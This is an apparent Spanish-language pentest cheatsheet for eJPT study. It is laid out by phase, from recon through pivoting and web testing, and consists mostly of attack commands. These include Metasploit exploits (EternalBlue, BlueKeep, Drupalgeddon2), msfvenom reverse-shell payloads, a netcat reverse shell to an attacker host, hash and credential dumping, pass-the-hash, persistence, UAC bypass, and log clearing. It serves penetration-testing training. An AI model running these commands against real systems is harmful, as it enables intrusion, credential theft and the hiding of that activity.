# Pentest Methodology Cheatsheet

Notas de referencia rápida organizadas siguiendo el flujo real de un pentest (recon → enumeración → explotación → post-explotación → pivoting → web), en vez de una lista plana de comandos por herramienta. La idea es poder seguir esta guía de arriba a abajo durante un engagement o un examen tipo eJPT y saber siempre "en qué fase estoy".

> Basado inicialmente en apuntes compartidos por un compañero, reorganizados y ampliados con mi propia práctica en TryHackMe/HackTheBox y en mi laboratorio de pivoting en VirtualBox durante la preparación del eJPT v2.

---

## Índice

1. [Reconocimiento Pasivo](#1-reconocimiento-pasivo)
2. [Reconocimiento Activo](#2-reconocimiento-activo)
3. [Escaneo de Puertos y Servicios](#3-escaneo-de-puertos-y-servicios)
4. [Enumeración por Servicio](#4-enumeración-por-servicio)
5. [Búsqueda de Exploits](#5-búsqueda-de-exploits)
6. [Explotación por Servicio](#6-explotación-por-servicio)
7. [Shells y Payloads](#7-shells-y-payloads)
8. [Post-Explotación — Windows](#8-post-explotación--windows)
9. [Post-Explotación — Linux](#9-post-explotación--linux)
10. [Escalada de Privilegios](#10-escalada-de-privilegios)
11. [Dumping de Credenciales](#11-dumping-de-credenciales)
12. [Pivoting / Movimiento Lateral](#12-pivoting--movimiento-lateral)
13. [Persistencia](#13-persistencia)
14. [Limpieza de Rastros](#14-limpieza-de-rastros)
15. [Pentesting Web](#15-pentesting-web)

---

## 1. Reconocimiento Pasivo

Todo lo que se puede obtener **sin tocar directamente** al objetivo.

### Whois
```bash
whois <HOST>
whois <IP>
```

### Google Dorking
```
site:target.com
site:*.target.com
site:*.target.com inurl:login
site:*.target.com inurl:admin
site:*.target.com intitle:admin
site:*.target.com intitle:"index of"
intitle:"index of" "credentials"
site:*.target.com inurl:backup
site:*.target.com inurl:.git
site:*.target.com inurl:.env
site:*.target.com filetype:sql
site:*.target.com filetype:log
site:*.target.com filetype:bak
site:*.target.com "confidential"
inurl:"robots.txt"
inurl:"sitemap.xml"
```

### Email Harvesting
```bash
theharvester -d target.com -b all
theharvester -d target.com -b linkedin
theharvester -d target.com -b pgp
```
> En mi experiencia `theharvester` a veces no aporta nada útil — no descartar otras fuentes si sale vacío.

### Enumeración de Subdominios (pasiva)
```bash
sublist3r -d target.com
```
> No es 100% fiable — subdominios no indexados no aparecerán. Útil como primer paso, no como única fuente.

### Directorios típicos a probar manualmente
```
/robots.txt  /sitemap.xml
/admin/  /admin.php  /login/  /login.php
/administrator/  /adminpanel/  /controlpanel/  /cpanel/
/dashboard/  /useradmin/  /backend/  /portal/
/wp-admin/  /phpmyadmin/  /pma/
```

### Fingerprinting de tecnología web
- https://builtwith.com/ — extensión = pasivo
- https://www.wappalyzer.com/ — extensión = pasivo (la CLI/API ya se considera activo)

---

## 2. Reconocimiento Activo

### Ping Sweep
```bash
fping -a -g 10.10.23.0/24 2>/dev/null
nmap -sn 192.168.1.1
netdiscover -i eth0 -r 192.168.2.0/24
```

### Host Discovery
```bash
nmap -sn -v -T4 10.2.4.5
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 10.2.4.5
```

### Banner Grabbing
```bash
nc 192.105.220.2 22
nmap -sV --script=banner 192.8.94.3
```

### DNS
```bash
dnsrecon -d target.com
```
- DNSDumpster: https://dnsdumpster.com/

### DNS Zone Transfer
```bash
nmap --script=dns-zone-transfer -p 53 target.com
fierce -dns zonetransfer.me
host -l zonetransfer.me nsztm.digi.ninja.
dig axfr @nsztm1.digi.ninja zonetransfer.me
```
> Configuraciones corporativas mal hechas a veces filtran IPs internas por aquí.

### Enumeración de Subdominios (activa)
```bash
sublist3r -d target.com -b brute
amass enum -active -d target.com
```

### Fuerza Bruta de Directorios
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o gobuster_results.txt
dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt -r -o dirb_results.txt
```

### Detección de WAF
```bash
wafw00f target.com -a
```

---

## 3. Escaneo de Puertos y Servicios

### Puertos comunes de referencia

| Puerto     | Servicio |
|------------|----------|
| 21         | FTP      |
| 22         | SSH      |
| 23         | Telnet   |
| 25         | SMTP     |
| 53         | DNS      |
| 80 / 443   | HTTP/S   |
| 110        | POP3     |
| 139, 445   | SMB      |
| 143        | IMAP     |
| 1433       | MS SQL   |
| 3306       | MySQL    |
| 3389       | RDP      |
| 5985       | WinRM    |

### Escaneos Nmap típicos (orden de uso real en un examen/engagement)
```bash
# Rápido, buen punto de partida (ruidoso pero completo)
nmap -sS -A -p- -T4 -sC 192.145.12.4

# Si necesito ir más a fondo con todos los scripts NSE
nmap -sS -A -p- -T4 --script=all 192.145.12.4

# Versión más ligera, casi siempre suficiente
nmap -sS -sV -O -sC -T4 192.145.12.4

# UDP
nmap demo.ine.local -p 1-250 -sU
nmap demo.ine.local -T4 -sU -p 161 -A
```

### Con Metasploit
```
db_nmap -Pn -sV -O <TARGET_IP>
hosts
services

use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET_IP>
set PORTS 1-1000
run
```

---

## 4. Enumeración por Servicio

### SMB (445 / 139)
```bash
nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-vuln-* <TARGET_IP>

smbmap -u guest -p "" -d . -H <TARGET_IP>
smbclient -L <TARGET_IP> -N
enum4linux -u <USER> -p <PW> -U <TARGET_IP>
```

### FTP (21)
```bash
nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 --script ftp-anon <TARGET_IP>
ftp <TARGET_IP>   # probar anonymous:anonymous
```

### SSH (22)
```bash
nmap -p 22 -sV -sC -O <TARGET_IP>
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>
```

### HTTP (80/443)
```bash
nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
```

### MySQL / MSSQL
```bash
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
nmap -p 3306 --script=mysql-info <TARGET_IP>
nmap -p 1433 --script=ms-sql-info <TARGET_IP>
nmap -p 1433 --script=ms-sql-empty-password <TARGET_IP>
```

### SMTP (25)
```bash
nmap -p 25 -sV -sC -O <TARGET_IP>
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
```

---

## 5. Búsqueda de Exploits

```bash
searchsploit ssh
searchsploit remote linux ssh OpenSSH
searchsploit remote webapps wordpress
searchsploit -m /PATH        # copiar exploit a la ruta actual
searchsploit -w vsftpd       # mostrar link web
```

```
# Metasploit
search type:exploit name:Microsoft IIS
search eternalblue
search bluekeep
```

Fuentes externas:
- https://www.exploit-db.com/
- https://www.rapid7.com/db/?type=metasploit

---

## 6. Explotación por Servicio

### Fuerza bruta general (Hydra)
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ftp
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form \
  "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
```

### SMB → EternalBlue / PsExec
```
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>

use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <PW>
```

### WebDAV (IIS, 80)
```bash
davtest -url http://<TARGET_IP>/webdav
cadaver http://<TARGET_IP>/webdav
put /usr/share/webshells/asp/webshell.asp
```
```
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS <TARGET_IP>
set HttpUsername <USER>
set HttpPassword <PW>
```

### Samba (Linux)
```
use exploit/linux/samba/is_known_pipename
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
```

### Shellshock
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set TARGETURI /gettime.cgi
```

### vsftpd / ProFTPD (backdoors conocidos)
```
use exploit/unix/ftp/vsftpd_234_backdoor
use exploit/unix/ftp/proftpd_133c_backdoor
```

### WinRM
```bash
crackmapexec winrm <TARGET_IP> -u administrator -p wordlist.txt
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
```

### RDP (BlueKeep)
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set target <NUMBER>
set GROOMSIZE 50
```
```bash
xfreerdp /u:Administrator /p:<PW> /v:<TARGET_IP>:3389
```

---

## 7. Shells y Payloads

### msfvenom — generación rápida
```bash
# Windows
msfvenom -a x64 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f exe > payload64.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f elf > payload64.elf

# Webshell ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f asp > shell.asp
```

### Upgrade de shell a TTY interactiva (Linux)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z para background
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=xterm
reset
```

### Netcat — listener / reverse / bind
```bash
# Listener en atacante
nc -nvlp <PORT>

# Reverse shell Linux
nc -nv <ATTACKER_IP> <PORT> -e /bin/bash

# Bind shell Windows
nc.exe -nvlp <PORT> -e cmd.exe
```

### Meterpreter → shell to meterpreter (sobre shell ya obtenida)
```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST <IP>
run
```

---

## 8. Post-Explotación — Windows

```
sysinfo
getuid
getprivs
pgrep explorer.exe
migrate <PID>
```

```cmd
whoami /priv
net users
net localgroup Administrators
ipconfig /all
netstat -ano
tasklist /SVC
schtasks /query /fo LIST /v
```

Módulos útiles:
```
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_shares
use post/windows/manage/enable_rdp
```

---

## 9. Post-Explotación — Linux

```bash
whoami
cat /etc/passwd
uname -a
netstat -antp
ps aux
sudo -l
```

Módulos útiles:
```
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system
use post/linux/gather/checkcontainer
use post/linux/gather/checkvm
```

---

## 10. Escalada de Privilegios

### Windows
```
use post/multi/recon/local_exploit_suggester
set SESSION <ID>
run
```
> `getsystem` es el primer intento rápido antes de buscar exploits específicos de kernel.

UAC Bypass:
```
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION 1
run
# luego:
ps -S lsass.exe
migrate <PID>
getsystem
```

Token Impersonation:
```
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### Linux
```bash
# Permisos débiles
find / -not -type l -perm -o+w
find / -perm -u=s -type f 2>/dev/null   # SUID

sudo -l   # comandos permitidos vía sudo

# Kernel exploits
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh

# Cron jobs
crontab -l
```
> Nota personal: casi siempre vale la pena revisar `sudo -l` primero — GTFOBins tiene binarios que muchos passan por alto como vector de escape rápido.

---

## 11. Dumping de Credenciales

### Windows
```
migrate -N lsass.exe
hashdump

load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```

Pass-the-Hash:
```
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass <LM:NTLM_HASH>
```
```bash
crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
```

### Linux
```bash
cat /etc/passwd
sudo cat /etc/shadow
```
```
use post/linux/gather/hashdump
```
```bash
john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 12. Pivoting / Movimiento Lateral

```
# Dentro de una sesión meterpreter ya comprometida
run autoroute -s 10.0.16.0/20

background
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit
```

```bash
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

Port forwarding para acceder a un segundo host sin ruta directa:
```
portfwd add -l 1234 -p 80 -r 10.2.27.45
portfwd list
```

> Flujo que sigo en la práctica: comprometer host 1 → `ipconfig`/`ifconfig` para ver si tiene doble NIC → `autoroute` → escanear la red interna con `portscan/tcp` → si hay un puerto interesante, `portfwd` en vez de intentar acceder directo por navegador (esto último no funciona sin forwarding).

---

## 13. Persistencia

### Windows
```
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set SESSION 1
```

### Linux
```bash
# Vía SSH key
use post/linux/manage/sshkey_persistence
set CREATESSHFOLDER true

# Vía cron
echo "* * * * * cd /home/user && python -m SimpleHTTPServer" > cron
crontab -i cron
```

---

## 14. Limpieza de Rastros

```
clearenv
```
```bash
history -c
cat /dev/null > ~/.bash_history
```

---

## 15. Pentesting Web

### Enumeración con Curl
```bash
curl -I <TARGET_IP>
curl -X OPTIONS <TARGET_IP> -v
curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v
```

### WebDAV con método PUT
```bash
echo "Hello World" > hello.txt
curl <TARGET_IP>/uploads/ --upload-file hello.txt
curl -X DELETE <TARGET_IP>/uploads/hello.txt -v
```

### WordPress
```bash
curl https://victim.com/ | grep 'content="WordPress'
curl http://blog.example.com/wp-json/wp/v2/users
```
```bash
wpscan --url "http://target.ip" -e vp    # plugins vulnerables
wpscan --url "http://target.ip" -e u     # usuarios
wpscan --url "http://target.ip" --passwords /usr/share/wordlists/rockyou.txt
```
```
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME admin
set PASSWORD admin
set targeturi /wordpress
```

### Drupal
```
use exploit/unix/webapp/drupal_drupalgeddon2
```
> Referencia detallada de Drupalgeddon2 (CVE-2018-7600): https://ine.com/blog/cve-2018-7600-drupalgeddon-2

### Fuerza bruta de formularios
```bash
hydra -L usernames.txt -P /root/wordlists/100-common-passwords.txt target.ine.local http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid username or password"
```

---

## Notas personales

- Preparado durante mi estudio para el **eJPT v2** (INE Security) — validado contra 24+ máquinas de TryHackMe/HackTheBox y un laboratorio propio de pivoting en VirtualBox.
- En examen/engagement, adaptar siempre según las herramientas realmente disponibles en el entorno — no asumir que todo lo de aquí estará instalado.
- Pendiente de ampliar: sección de Active Directory / Kerberos a medida que avance en esa parte.
